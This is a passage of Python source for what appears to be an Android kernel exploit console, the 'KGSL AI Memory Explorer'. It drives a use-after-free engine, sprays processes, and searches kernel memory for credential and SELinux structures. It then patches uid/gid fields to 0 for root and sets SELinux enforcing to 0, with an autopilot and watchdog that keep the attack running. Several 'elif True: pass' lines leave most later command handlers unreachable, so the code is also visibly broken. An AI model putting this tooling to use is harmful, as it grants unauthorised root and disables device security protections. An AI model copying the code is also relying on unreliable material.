        item = self.found_items[item_idx]
        # Fetch the data if we don't have it (auto-found items don't carry data).
        # We use read_with_neighbors so we can show prev/next pages and catch
        # cross-page patterns (kernel pointer at page end, comm at boundary, …).
        data = item.get("data")
        data_prev = item.get("data_prev")
        data_next = item.get("data_next")
        if data is None:
            try:
                va = int(item["va"], 16)
            except Exception:
                self.live["last_msg"] = f"Invalid VA: {item['va']}"
                return
            triple = self.read_with_neighbors(va) or b""
            if len(triple) == 12288:
                data_prev, data, data_next = triple[0:0x1000], triple[0x1000:0x2000], triple[0x2000:0x3000]
                item["data_prev"] = data_prev
                item["data_next"] = data_next
            elif triple:
                data = triple
            else:
                data = self.read_page(va) or b""
            item["data"] = data
        # Confidence is stored as 0-100 integer now
        conf = item.get("confidence", 0)
        conf_disp = f"{conf:.1f}%" if isinstance(conf, float) else f"{conf}%"

        sys.stdout.write(C.CLR)
        try:
            va_int = int(item["va"], 16)
            va_prev = f"0x{va_int - 0x1000:x}" if data_prev else "—"
            va_next = f"0x{va_int + 0x1000:x}" if data_next else "—"
        except Exception:
            va_prev, va_next = "—", "—"
        sys.stdout.write(f"{C.BOLD}{C.CYN}=== FILE VIEW: [{item_idx:02d}] {item['va']} ==={C.RST}\n")
        sys.stdout.write(f"{C.GRY}Type:{C.RST} {item['type']:<20} "
                         f"{C.GRY}Confidence:{C.RST} {C.GRN}{conf_disp}{C.RST}\n")
        sys.stdout.write(f"{C.GRY}AI Logic:{C.RST} {self.translate_logic(item)}\n")
        sys.stdout.write(f"{C.GRY}{'─'*75}{C.RST}\n")
        # Show prev page (if any) — useful for cross-page patterns
        if data_prev:
            sys.stdout.write(f" {C.DIM}── PREV PAGE @ {va_prev} ──{C.RST}\n")
            for i in range(0, min(len(data_prev), 256), 16):
                chunk = data_prev[i:i+16]
                hex_row = " ".join(f"{b:02X}" for b in chunk)
                printable = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
                sys.stdout.write(f" {i:04X} | {hex_row:<48} | {printable}\n")
        if data:
            sys.stdout.write(f" {C.DIM}── THIS PAGE @ {item['va']} ──{C.RST}\n")
            for i in range(0, min(len(data), 256), 16):
                chunk = data[i:i+16]
                hex_row = " ".join(f"{b:02X}" for b in chunk)
                printable = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
                sys.stdout.write(f" {i:04X} | {hex_row:<48} | {printable}\n")
        else:
            sys.stdout.write(f" {C.GRY}(no data — read failed){C.RST}\n")
        if data_next:
            sys.stdout.write(f" {C.DIM}── NEXT PAGE @ {va_next} ──{C.RST}\n")
            for i in range(0, min(len(data_next), 256), 16):
                chunk = data_next[i:i+16]
                hex_row = " ".join(f"{b:02X}" for b in chunk)
                printable = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
                sys.stdout.write(f" {i:04X} | {hex_row:<48} | {printable}\n")
        sys.stdout.write(f"{C.GRY}{'─'*75}{C.RST}\n")
        sys.stdout.write(f" [{C.GRN}K{C.RST}] Patch Root  "
                         f"[{C.GRN}S{C.RST}] Patch SELinux  "
                         f"[{C.GRN}D{C.RST}] Delete from list  "
                         f"[{C.GRN}V{C.RST}] Re-verify (3pg)  "
                         f"[{C.GRN}Enter{C.RST}] Back\n")
        sys.stdout.flush()
        try:
            choice = self.input_cmd().strip().lower()
        except (EOFError, KeyboardInterrupt):
            return
        if not choice or choice in ("enter", "b", "back", "q"):
            return  # Enter (empty) goes back to TUI
        if choice == "k":
            # Patch init_cred uid/gid to 0 (root) at this VA
            try:
                base = int(item["va"], 16)
                results = []
                for off in (4, 8, 12, 16, 20, 24):
                    r = self.patch_mem(base + off, 0)
                    results.append(str(r))
                self.live["last_msg"] = f"Patch Root: {', '.join(results[:3])}"
            except Exception as e:
                self.live["last_msg"] = f"Patch error: {e}"
        elif choice == "s":
            # Patch SELinux enforcing to 0
            try:
                target = self.selinux_va or 0xffffffc002caa000
                r = self.patch_mem(target, 0)
                self.live["last_msg"] = f"Patch SELinux: {r}"
            except Exception as e:
                self.live["last_msg"] = f"Patch error: {e}"
        elif choice == "d":
            # Delete this item from the list
            with self.bg_lock:
                if 0 <= item_idx < len(self.found_items):
                    self.found_items.pop(item_idx)
            self.live["last_msg"] = f"Deleted item [{item_idx:02d}]"
        elif choice == "v":
            # Re-verify using 3-page read (with neighbors)
            self.verify_item(item_idx)
            # Re-enter the detail view so the user sees the new data
            self.show_detail(item_idx)

    # ============== MAIN LOOP ==============

    def _render_paused_set_noop(self):
        pass  # compatibility shim, no-op in single-thread mode

    def run(self):
        if not os.path.exists(self.engine_path):
            self.try_compile_engine()
        if not self.ensure_engine():
            print(f"{C.RED}[CRIT] Could not start engine. Check GCC/Clang.{C.RST}", flush=True)
            return

        # === BIG AUTO-MODE BANNER ===
        # Print a clear, eye-catching banner so the user knows the
        # new version is running and the autopilot is starting.
        # Without this, if TUI looks the same as before they might
        # not realize auto-start is working. We clear the screen,
        # print the banner, and pause briefly so it's visible.
        import sys as _sys
        _sys.stdout.write("\033[2J\033[H")  # clear screen + home
        _sys.stdout.flush()
        banner = f"""
{C.CYN}{C.BOLD}╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   {C.YEL}KGSL AI MEMORY EXPLORER v4.1 — Q-LEARN AUTO MODE{C.CYN}                  ║
║                                                                      ║
║   {C.GRN}✓ autopilot    : STARTING NOW{C.CYN}                                     ║
║   {C.GRN}✓ learning     : 3 spray workers + W3 deep-scan{C.CYN}                  ║
║   {C.GRN}✓ watchdog     : ENABLED (auto-restart on crash){C.CYN}                  ║
║   {C.GRN}✓ adaptive     : 5 scan ranges × 8MB = 40MB{C.CYN}                       ║
║   {C.GRN}✓ Q-learning   : auto-tunes batch+comm+range{C.CYN}                      ║
║   {C.GRN}✓ spray v4     : popen_sleep + mmap_anon{C.CYN}                           ║
║   {C.GRN}✓ perf counter : pages/MB/scans visible{C.CYN}                            ║
║   {C.GRN}✓ histogram    : confidence distribution{C.CYN}                          ║
║                                                                      ║
║   {C.MAG}You should NOT press any keys. Watch the TUI update.{C.CYN}                 ║
║   {C.GRY}Wait 5-10 seconds for first SCAN_DONE in LAST MSG.{C.CYN}                  ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝{C.RST}
"""
        print(banner, flush=True)
        import time as _t
        _t.sleep(2.0)  # let user see the banner

        # === START THE DEDICATED RENDER THREAD ===
        # This is the key fix for "TUI doesn't update on Termux".
        # A SEPARATE background thread continuously redraws the TUI
        # at self.render_hz (default 5 Hz). The main thread just
        # reads input — no select()-timeout hacks needed.
        pass

        # === AUTO-START AUTOPILOT ===
        # The whole point of this mode: user shouldn't have to press anything.
        # We start the autopilot immediately. User can pause with P, resume
        # with G, or stop with X.
        if self.autopilot_mode and not (self.autopilot_thread and self.autopilot_thread.is_alive()):
            self.cmd_autopilot_start()
            # Also start learning right away
            if not (self.bg_thread and self.bg_thread.is_alive()):
                self.cmd_learning_start()
            # Auto-start W3 deep-scan worker (the 4th worker
            # that re-scans Empty Page locations the user
            # specifically asked for). Without this the user
            # has to press 'w3' manually to start it.
            if not self.w3_enabled:
                self.cmd_w3_toggle()

        # === WATCHDOG THREAD ===
        # Without this, if autopilot or learning crashes (e.g. SIGSYS
        # from a bad syscall, or engine pipe broken, or OOM), the
        # user has to press E, L, R manually to restart. The watchdog
        # polls every 1s and restarts any dead worker. It also
        # restarts the engine if it died.
        def _watchdog():
            import time as _t
            restart_count = {"autopilot": 0, "learning": 0, "engine": 0}
            last_check = 0.0
            last_full_status = 0.0
            while not self.cancel_flag.is_set():
                _t.sleep(0.5)
                now = _t.time()
                # Throttle heavy checks to every 1s
                if now - last_check < 1.0:
                    continue
                last_check = now
                # Skip if user explicitly paused or stopped
                if self.autopilot_paused or not self.autopilot_mode:
                    continue
                # 1) Engine alive check
                if (not self._engine_alive()
                    and self.live.get("engine_pid", 0) != 0):
                    # Engine was running but died
                    restart_count["engine"] += 1
                    try:
                        self.live["last_msg"] = (
                            f"Watchdog: engine died, restarting "
                            f"(#{restart_count['engine']})")
                        self.exploit_proc = None
                        self.ensure_engine()
                    except Exception:
                        pass
                # 2) Autopilot alive check
                if (self.autopilot_mode
                    and not (self.autopilot_thread
                             and self.autopilot_thread.is_alive())):
                    restart_count["autopilot"] += 1
                    if restart_count["autopilot"] <= 5:
                        try:
                            self.live["last_msg"] = (
                                f"Watchdog: restarting autopilot "
                                f"(#{restart_count['autopilot']})")
                            self.cmd_autopilot_start()
                        except Exception:
                            pass
                    elif restart_count["autopilot"] == 6:
                        self.live["last_msg"] = (
                            "Watchdog: autopilot keeps dying, giving up "
                            "auto-restart. Press A to start manually.")
                # 3) Learning alive check
                if (not (self.bg_thread and self.bg_thread.is_alive())):
                    restart_count["learning"] += 1
                    if restart_count["learning"] <= 5:
                        try:
                            self.live["last_msg"] = (
                                f"Watchdog: restarting learning "
                                f"(#{restart_count['learning']})")
                            self.cmd_learning_start()
                        except Exception:
                            pass
                # 4) Periodic status broadcast (every 30s) so the
                # user sees what's happening without pressing anything.
                if now - last_full_status > 30.0:
                    last_full_status = now
                    total_restarts = sum(restart_count.values())
                    if total_restarts > 0:
                        self.live["last_msg"] = (
                            f"Watchdog OK: "
                            f"engine={restart_count['engine']} "
                            f"auto={restart_count['autopilot']} "
                            f"learn={restart_count['learning']} restarts")
                # 5) Publish restart counts to live so TUI can show
                with self.stats_lock:
                    self.live["watchdog_restarts"] = restart_count.copy()
        threading.Thread(target=_watchdog, daemon=True).start()

        # Main loop: read input. input_cmd() itself redraws the TUI
        # every 0.3s of no-keypress, so the user sees live updates
        # WITHOUT pressing any keys.
        # We do ONE initial render here so the TUI is on-screen
        # before the user has a chance to type anything.
        self.render_tui()
        while True:
            try:
                cmd = self.input_cmd().lower()
            except (EOFError, KeyboardInterrupt):
                cmd = "q"

            if cmd in ("q", "quit", "exit"):
                self.cmd_autopilot_stop()
                self.cancel_flag.set()
                if self.exploit_proc:
                    try:
                        self.exploit_proc.stdin.write(b"quit\n")
                        self.exploit_proc.terminate()
                    except Exception:
                        pass
                # Kill from per-worker sets (not the stale self.spray_procs
                # which is no longer the source of truth).
                for wid, pids in list(self.spray_procs_by_worker.items()):
                    for pid in list(pids):
                        try:
                            os.kill(pid, 9)
                            os.waitpid(pid, 0)
                        except Exception:
                            pass
                    pids.clear()
                pass
                break
            elif cmd in ("p", "pause"):
                self.cmd_autopilot_pause()
            elif cmd in ("g", "go", "resume"):
                self.cmd_autopilot_resume()
            elif cmd in ("x", "stop"):
                self.cmd_autopilot_stop()
            elif cmd in ("a", "auto", "autopilot"):
                # Toggle autopilot
                if self.autopilot_thread and self.autopilot_thread.is_alive():
                    self.cmd_autopilot_stop()
                else:
                    self.cmd_autopilot_start()
            elif cmd in ("auto!", "forceauto", "all"):
                # Force-restart EVERYTHING: cancel all threads, kill
                # all sprays, restart engine, restart autopilot,
                # restart learning. Use this if the user pressed
                # 'A' but it didn't help, or if everything is stuck.
                try:
                    self.cmd_autopilot_stop()
                except Exception:
                    pass
                self.cancel_flag.set()
                time.sleep(0.3)
                self.cancel_flag.clear()
                # Kill all per-worker sprays
                for wid, pids in list(self.spray_procs_by_worker.items()):
                    for pid in list(pids):
                        try:
                            os.kill(pid, 9)
                        except Exception:
                            pass
                    pids.clear()
                # Force-kill engine
                if self.exploit_proc:
                    try:
                        self.exploit_proc.terminate()
                    except Exception:
                        pass
                    self.exploit_proc = None
                self.live["engine_pid"] = 0
                # Re-compile engine (in case it's stale)
                self.try_compile_engine()
                time.sleep(0.5)
                # Reset watchdog counters
                self.live["watchdog_restarts"] = {"autopilot": 0, "learning": 0, "engine": 0}
                # Start everything fresh
                self.cmd_autopilot_start()
                self.cmd_learning_start()
                self.live["last_msg"] = "FORCE-RESTART: autopilot + learning re-started"
            elif cmd in ("e", "exploit"):
                self.trigger_exploit()
            elif cmd in ("l", "learn"):
                self.cmd_learning_start()
            elif cmd in ("s", "scan"):
                self.cmd_scan()
            elif cmd in ("w", "watch"):
                if self.watch_mode:
                    self.cmd_watch_stop()
                else:
                    self.cmd_watch_start()
            elif cmd in ("c", "clear"):
                self.cmd_clear()
            elif cmd in ("r", "root"):
                self.cmd_verify_root()
            elif cmd in ("b", "build"):
                self.cmd_rebuild()
            elif cmd.startswith("rate"):
                # rate<N> — change render FPS live
                pass  # rate command removed (single-thread mode)
            elif cmd in ("log", "logs"):
                # show last 20 spray log entries
                # We pause the render thread so the user can see the
                # log clearly without it being overwritten.
                try:
                    self._render_paused_set_noop()  # no-op in single-thread
                    print(C.CLR, end="", flush=True)
                    print(f"{C.BOLD}{C.CYN}=== SPRAY LOG (last 20) ==={C.RST}", flush=True)
                    print(f"{C.GRY}{'─'*75}{C.RST}", flush=True)
                    if not self.spray_log:
                        print(f"{C.GRY}(empty — no sprays yet){C.RST}", flush=True)
                    else:
                        for e in self.spray_log[-20:]:
                            print(json.dumps(e), flush=True)
                    print(f"{C.GRY}{'─'*75}{C.RST}", flush=True)
                    print(f"\n{C.GRY}Log file: {C.WHT}{self.log_path}{C.RST}", flush=True)
                    print("Press Enter to return...", flush=True)
                    try:
                        self.input_cmd()
                    except Exception:
                        pass
                finally:
                    pass  # (no-op, single-thread)
            elif cmd in ("list", "ls", "items"):
                # Show ALL found items (paginated 25 per page)
                # Pause the render thread so it doesn't clobber our output.
                try:
                    self._render_paused_set_noop()  # no-op in single-thread
                    print(C.CLR, end="", flush=True)
                    print(f"{C.BOLD}{C.CYN}=== FOUND MEMORY OFFSETS ({len(self.found_items)} total) ==={C.RST}", flush=True)
                    print(f"{C.GRY}{'─'*92}{C.RST}", flush=True)
                    if not self.found_items:
                        print(f"{C.GRY}(empty — no items yet){C.RST}", flush=True)
                    else:
                        page_size = 25
                        total = len(self.found_items)
                        pages = (total + page_size - 1) // page_size
                        page = 0
                        while page < pages:
                            start = page * page_size
                            end = min(start + page_size, total)
                            print(f"{C.MAG}── Page {page+1}/{pages} "
                                  f"({start}..{end-1}) ──{C.RST}", flush=True)
                            for i in range(start, end):
                                it = self.found_items[i]
                                color = {"Kernel Core": C.RED, "Privilege Struct": C.YEL,
                                         "System App": C.BLU, "Kernel Code": C.MAG,
                                         "SELinux": C.RED, "SELinux (PATCHED)": C.GRN,
                                         "Privilege Struct (ROOTED)": C.GRN,
                                         "Kernel Global": C.CYN}.get(it['type'], C.GRY)
                                print(f" {C.GRY}[{i:02d}]{C.RST} "
                                      f"{color}{it['type']:<24}{C.RST} "
                                      f"{C.WHT}{it.get('description','')[:50]:<50}{C.RST} "
                                      f"{C.CYN}{it['va']}{C.RST}", flush=True)
                            page += 1
                            if page < pages:
                                print(f"\n{C.GRY}-- More -- (Enter for next page, q to quit){C.RST}", flush=True)
                                nxt = self.input_cmd().strip().lower()
                                if nxt in ("q", "quit", "x"):
                                    break
                    print(f"{C.GRY}{'─'*92}{C.RST}", flush=True)
                    print("Press Enter to return...", flush=True)
                    try:
                        self.input_cmd()
                    except Exception:
                        pass
                finally:
                    pass  # (no-op, single-thread)
            elif True:
                pass  # (no-op, single-thread)
            elif cmd in ("kb", "kbase"):
                # Show kernel base / SELinux / init_cred status
                try:
                    self._render_paused_set_noop()  # no-op in single-thread
                    print(C.CLR, end="", flush=True)
                    print(f"{C.BOLD}{C.CYN}=== KERNEL INTELLIGENCE ==={C.RST}", flush=True)
                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
                    print(f" {C.BOLD}Kernel base{C.RST} : "
                          f"{C.GRN if self.kernel_base else C.RED}"
                          f"{hex(self.kernel_base) if self.kernel_base else 'NOT FOUND'}{C.RST}", flush=True)
                    print(f" {C.BOLD}SELinux VA {C.RST} : "
                          f"{C.GRN if self.selinux_va else C.RED}"
                          f"{hex(self.selinux_va) if self.selinux_va else 'NOT FOUND'}{C.RST}", flush=True)
                    print(f" {C.BOLD}init_cred  {C.RST} : "
                          f"{C.GRN if self.cred_va else C.RED}"
                          f"{hex(self.cred_va) if self.cred_va else 'NOT FOUND'}{C.RST}", flush=True)
                    print(f"\n {C.DIM}AI patterns learned{C.RST}: "
                          f"{C.MAG}{self.live.get('ai_patterns', 0)}{C.RST}", flush=True)
                    print(f" {C.DIM}Knowledge base entries{C.RST}: "
                          f"{C.MAG}{sum(len(v) for v in self.knowledge_base.values() if isinstance(v, list))}{C.RST}", flush=True)
                    print(f" {C.DIM}Render rate{C.RST}: "
                          f"{C.MAG}{self.render_hz:.1f} Hz{C.RST}", flush=True)
                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
                    print("Press Enter to return...", flush=True)
                    try:
                        self.input_cmd()
                    except Exception:
                        pass
                finally:
                    pass  # (no-op, single-thread)
            elif True:
                pass  # (no-op, single-thread)
            elif cmd in ("xt", "xattr", "togglesetxattr"):
                # Toggle setxattr spray technique. Default OFF
                # because raw syscall(188) can trigger SIGSYS on
                # Termux and kill the process. Enable only after
                # confirming the device allows the syscall.
                self.use_xattr_spray = not self.use_xattr_spray
                state = "ON" if self.use_xattr_spray else "OFF"
                self.live["last_msg"] = (
                    f"setxattr spray: {state}. "
                    f"{'Next spray will add xattr per process.' if self.use_xattr_spray else 'Using only task_struct comm spray.'}")
            elif cmd in ("w3", "deep", "w3toggle"):
                # Toggle W3 deep-scan worker. The 4th dedicated
                # worker that re-scans Empty Page locations.
                self.cmd_w3_toggle()
            elif cmd in ("ks", "kallsyms"):
                # Reload /proc/kallsyms. Useful when the explorer
                # was started before the user had kallsyms access,
                # or to refresh the symbol table.
                self._kallsyms_loaded = False
                self.kallsyms = {}
                n = self.load_kallsyms()
                self.live["last_msg"] = f"kallsyms reloaded: {n} symbols"
            elif cmd in ("ksd", "kdump"):
                # Dump kallsyms cache
                if not self.kallsyms:
                    print("kallsyms: empty (not loaded)", flush=True)
                else:
                    print(f"kallsyms ({len(self.kallsyms)} symbols):",
                          flush=True)
                    for name, addr in sorted(self.kallsyms.items()):
                        print(f"  0x{addr:016x}  {name}", flush=True)
            elif cmd in ("stats", "stat"):
                # Detailed learning statistics
                try:
                    self._render_paused_set_noop()  # no-op in single-thread
                    print(C.CLR, end="", flush=True)
                    print(f"{C.BOLD}{C.CYN}=== AI LEARNING STATS ==={C.RST}", flush=True)
                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
                    s = getattr(self, "learn_stats", {}) or {}
                    print(f" {C.BOLD}Batches run{C.RST}      : {C.MAG}{s.get('batches', 0)}{C.RST}", flush=True)
                    print(f" {C.BOLD}Sprays total{C.RST}     : {C.MAG}{s.get('sprayed_total', 0)}{C.RST}", flush=True)
                    print(f" {C.BOLD}Matches{C.RST}          : {C.YEL}{s.get('matches', 0)}{C.RST}", flush=True)
                    print(f" {C.BOLD}Verified{C.RST}         : {C.GRN}{s.get('verified', 0)}{C.RST}", flush=True)
                    print(f" {C.BOLD}Auto-kept{C.RST}        : {C.CYN}{s.get('auto_kept', 0)}{C.RST} (weak-but-interesting)", flush=True)
                    print(f" {C.BOLD}False positives{C.RST}  : {C.RED}{s.get('false_positives', 0)}{C.RST}", flush=True)
                    if s.get("matches", 0) > 0:
                        rate = 100.0 * s.get("verified", 0) / s["matches"]
                        print(f" {C.BOLD}Verify rate{C.RST}      : {C.MAG}{rate:.1f}%{C.RST}", flush=True)
                    print(f"\n {C.DIM}Found items in list{C.RST}: {C.MAG}{len(self.found_items)}{C.RST}", flush=True)
                    print(f" {C.DIM}Spray procs alive{C.RST}  : {C.MAG}{len(self.spray_procs)}{C.RST}", flush=True)
                    print(f" {C.DIM}Engine PID{C.RST}        : {C.MAG}{self.live.get('engine_pid', 0)}{C.RST}", flush=True)
                    print("", flush=True)
                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
                    print("Press Enter to return...", flush=True)
                    try:
                        self.input_cmd()
                    except Exception:
                        pass
                finally:
                    pass  # (no-op, single-thread)
            elif True:
                pass  # (no-op, single-thread)
            elif cmd in ("save", "dump", "export"):
                # Save found items to JSON file
                out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                        "found_items.json")
                try:
                    export = []
                    for it in self.found_items:
                        # Don't dump raw page data to JSON (too large)
                        e = {k: v for k, v in it.items() if k != "data"}
                        export.append(e)
                    with open(out_path, "w") as f:
                        json.dump({"ts": datetime.datetime.now().isoformat(),
                                   "kernel_base": hex(self.kernel_base) if self.kernel_base else None,
                                   "selinux_va":  hex(self.selinux_va)  if self.selinux_va  else None,
                                   "cred_va":     hex(self.cred_va)     if self.cred_va     else None,
                                   "items": export}, f, indent=2)
                    self.live["last_msg"] = f"Saved {len(export)} items → {out_path}"
                except Exception as e:
                    self.live["last_msg"] = f"Save failed: {e}"
            elif cmd in ("device", "dev", "info"):
                # Show device / runtime info
                try:
                    self._render_paused_set_noop()  # no-op in single-thread
                    print(C.CLR, end="", flush=True)
                    print(f"{C.BOLD}{C.CYN}=== DEVICE / RUNTIME INFO ==={C.RST}", flush=True)
                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
                    # Try getprop
                    for prop, label in [
                        ("ro.product.manufacturer", "Manufacturer"),
                        ("ro.product.model",        "Model"),
                        ("ro.product.brand",        "Brand"),
                        ("ro.product.device",       "Device"),
                        ("ro.build.version.release", "Android ver"),
                        ("ro.build.version.sdk",    "SDK"),
                        ("ro.product.cpu.abi",      "ABI"),
                        ("ro.boot.hardware",        "Hardware"),
                        ("ro.kernel.qemu",          "QEMU"),
                    ]:
                        try:
                            val = subprocess.check_output(["getprop", prop], text=True, timeout=1).strip()
                        except Exception:
                            val = "—"
                        print(f" {C.BOLD}{label:<14}{C.RST}: {C.WHT}{val}{C.RST}", flush=True)
                    # Engine path + size
                    try:
                        sz = os.path.getsize(self.engine_path)
                    except Exception:
                        sz = 0
                    print(f"\n {C.BOLD}Engine{C.RST}     : {C.CYN}{self.engine_path}{C.RST} ({sz} bytes)", flush=True)
                    print(f" {C.BOLD}PID{C.RST}        : {C.CYN}{self.live.get('engine_pid', 0)}{C.RST}", flush=True)
                    print(f" {C.BOLD}Uptime{C.RST}     : {C.CYN}{int(time.time() - self.live['uptime_start'])}s{C.RST}", flush=True)
                    print(f" {C.BOLD}RAM{C.RST}        : {C.CYN}{self.live.get('ram', 0):.1f}%{C.RST}", flush=True)
                    print(f" {C.BOLD}Render rate{C.RST}: {C.CYN}{self.render_hz:.1f} Hz{C.RST}", flush=True)
                    print(f"{C.GRY}{'─'*60}{C.RST}", flush=True)
                    print("Press Enter to return...", flush=True)
                    try:
                        self.input_cmd()
                    except Exception:
                        pass
                finally:
                    pass  # (no-op, single-thread)
            elif True:
                pass  # (no-op, single-thread)
            elif cmd in ("clear_kb", "reset_kb"):
                # Reset knowledge base
                self.knowledge_base = {
                    "successful_vas": [],
                    "selinux_candidates": [],
                    "cred_candidates": [],
                    "candidate_kbases": [],
                    "system_app_vas": [],
                    "kernel_markers": [],
                    "hit_count": 0,
                }
                self.save_kb()
                self.live["last_msg"] = "Knowledge base reset."
            elif cmd in ("walk", "follow", "wchain") or cmd.startswith("walk ") or cmd.startswith("follow "):
                # Manual cred-chain walk from item #idx
                parts = cmd.split()
                if len(parts) >= 2 and parts[1].isdigit():
                    idx = int(parts[1])
                    if 0 <= idx < len(self.found_items):
                        it = self.found_items[idx]
                        try:
                            base_va = int(it['va'], 16)
                        except Exception:
                            self.live["last_msg"] = f"Invalid VA: {it['va']}"
                            self.live["last_msg"] = "Walk usage: walk <id> [off]"
                            continue
                        off = 0x770
                        if len(parts) >= 3:
                            try:
                                off = int(parts[2], 0)
                            except Exception:
                                pass
                        self.live["last_msg"] = f"Manually walking chain from {it['va']}+0x{off:x}…"
                        chain = self.walk_cred_chain(base_va, off_in_page=off, max_hops=4)
                        for step_idx, (tgt, page, desc) in enumerate(chain):
                            self._add_found(
                                va=hex(tgt),
                                type="Privilege Struct",
                                desc=f"{desc} (manual hop {step_idx})",
                                confidence=95 if "ROOT" in desc else 70,
                                data=page,
                            )
                        self.live["last_msg"] = f"Walked {len(chain)} hops: " + " → ".join(
                            f"{hex(t[0])}" for t in chain)
                    else:
                        self.live["last_msg"] = f"Invalid idx: {parts[1]}"
                else:
                    self.live["last_msg"] = "Usage: walk <id> [off_in_page=0x770]"
            elif cmd in ("selsearch",) or cmd.startswith("selsearch "):
                # Manual brute-force SELinux search
                # Usage: selsearch [start_hex] [end_hex] [step_hex]
                if not self.kernel_base:
                    self.live["last_msg"] = "Need kernel_base first — press E"
                    continue
                parts = cmd.split()
                start = self.kernel_base + 0x1000000
                end   = self.kernel_base + 0x4000000
                step  = 0x1000
                if len(parts) >= 2:
                    try: start = int(parts[1], 16)
                    except: pass
                if len(parts) >= 3:
                    try: end = int(parts[2], 16)
                    except: pass
                if len(parts) >= 4:
                    try: step = int(parts[3], 16)
                    except: pass
                self.live["last_msg"] = (f"selsearch {hex(start)} .. {hex(end)} "
                                          f"step={hex(step)}…")
                hits = self.selsearch(start, end, step)
                # Add all hits to found_items so the user can review them
                for h in hits:
                    h_va, h_val, h_nz, h_ptr = h
                    self._add_found(
                        va=hex(h_va),
                        type="SELinux Candidate",
                        desc=f"val={h_val} (nz={h_nz} ptr={h_ptr}, brute-force)",
                        confidence=70 if h_val == 1 else 50,
                    )
                if hits:
                    h_va, h_val, h_nz, h_ptr = hits[0]
                    self.selinux_va = h_va
                    self.live["last_msg"] = (f"selsearch: {len(hits)} hits. "
                                              f"Best: {hex(h_va)} val={h_val} "
                                              f"(nz={h_nz} ptr={h_ptr}). Patch now?")
                else:
                    self.live["last_msg"] = f"selsearch: 0 hits in {hex(start)}..{hex(end)}"
            elif cmd in ("symlook",) or cmd.startswith("symlook "):
                # Manual symbol search
                # Usage: symlook <name>  (searches kbase..kbase+0x4000000)
                if not self.kernel_base:
                    self.live["last_msg"] = "Need kernel_base first — press E"
                    continue
                parts = cmd.split()
                if len(parts) < 2:
                    self.live["last_msg"] = "Usage: symlook <name>  (e.g. symlook selinux_enforcing)"
                    continue
                name = parts[1]
                self.live["last_msg"] = f"symlook '{name}' in kernel rodata…"
                va = self.symlook(self.kernel_base, self.kernel_base + 0x4000000, name)
                if va:
                    self.live["last_msg"] = f"symlook: '{name}' @ {hex(va)}"
                    self._add_found(
                        va=hex(va),
                        type="Kernel Symbol",
                        desc=f"String '{name}' found in kernel rodata",
                        confidence=95,
                    )
                else:
                    self.live["last_msg"] = f"symlook: '{name}' NOT found"
            elif cmd in ("help", "?", "h"):
                # Show full help
                sys.stdout.write(C.CLR)
                sys.stdout.write(f"{C.BOLD}{C.CYN}=== KGSL AI MEMORY EXPLORER — HELP ==={C.RST}\n")
                sys.stdout.write(f"{C.GRY}{'─'*75}{C.RST}\n")
                lines = [
                    ("A / autopilot",     "Toggle AUTOPILOT (auto-starts on launch)"),
                    ("P / pause",         "Pause autopilot (still responsive)"),
                    ("G / go / resume",   "Resume autopilot after pause"),
                    ("X / stop",          "Stop autopilot completely"),
                    ("E / exploit",       "Manual: run KGSL UAF → auto chain (kbase→selinux→cred→patch)"),
                    ("L / learn",         "Manual: start AI learning in background (Ctrl+P to cancel)"),
                    ("S / scan",          "Manual: one-shot scan of UAF range"),
                    ("W / watch",         "Manual: auto-retry exploit pipeline in background (toggle)"),
                    ("C / clear",         "Kill all spray processes, free RAM"),
                    ("R / root",          "Verify current uid (id command)"),
                    ("B / build",         "Recompile C engine (gcc/clang)"),
                    ("Q / quit",          "Exit explorer"),
                    ("<id>",              "Open detail view of found item #id"),
                    ("v<id>",             "Re-verify found item #id (re-read VA)"),
                    ("walk <id> [off]",   "Walk cred chain from item #id @ offset (default 0x770)"),
                    ("selsearch [s e stp]","Brute-force scan for SELinux enforcing in kernel data"),
                    ("symlook <name>",    "Search kernel rodata for a string symbol"),
                    ("list / ls / items", "Paginated dump of ALL found items"),
                    ("kb / kbase",        "Show kernel base / SELinux / init_cred status"),
                    ("log / logs",        "Show recent spray log (JSONL)"),
                    ("stats / stat",      "Show AI learning statistics"),
                    ("save / export",     "Save found items → found_items.json"),
                    ("dev / device",      "Show device info (getprop)"),
                    ("reset_kb",          "Reset knowledge base"),
                    ("help / ? / h",      "Show this help"),
                ]
                for k, v in lines:
                    sys.stdout.write(f"  {C.GRN}{k:<18}{C.RST} {C.WHT}{v}{C.RST}\n")
                sys.stdout.write(f"\n{C.MAG}── KEYBOARD SHORTCUTS ──{C.RST}\n")
                kbd = [
                    ("Enter",       "Submit command / go back from detail view"),
                    ("Backspace",   "Erase one char in command line"),
                    ("Up / Down",   "Browse command history"),
                    ("Ctrl+C",      "Quit explorer"),
                    ("Ctrl+P",      "Cancel running AI learning"),
                    ("Ctrl+E",      "Rewind to last submitted command"),
                ]
                for k, v in kbd:
                    sys.stdout.write(f"  {C.YEL}{k:<14}{C.RST} {C.WHT}{v}{C.RST}\n")
                sys.stdout.write(f"{C.GRY}{'─'*75}{C.RST}\n")
                sys.stdout.write("Press Enter to return...")
                sys.stdout.flush()
                try:
                    self.input_cmd()
                except Exception:
                    pass
            elif cmd.startswith("v") and cmd[1:].isdigit():
                # Re-verify a found item by re-reading its VA
                idx = int(cmd[1:])
                if 0 <= idx < len(self.found_items):
                    self.verify_item(idx)
                else:
                    self.live["last_msg"] = f"Invalid idx: {idx}"
            elif cmd.isdigit():
                self.show_detail(int(cmd))
            elif cmd:
                self.live["last_msg"] = f"Unknown: {cmd}"


if __name__ == "__main__":
    explorer = MemoryExplorerAI()
    explorer.run()
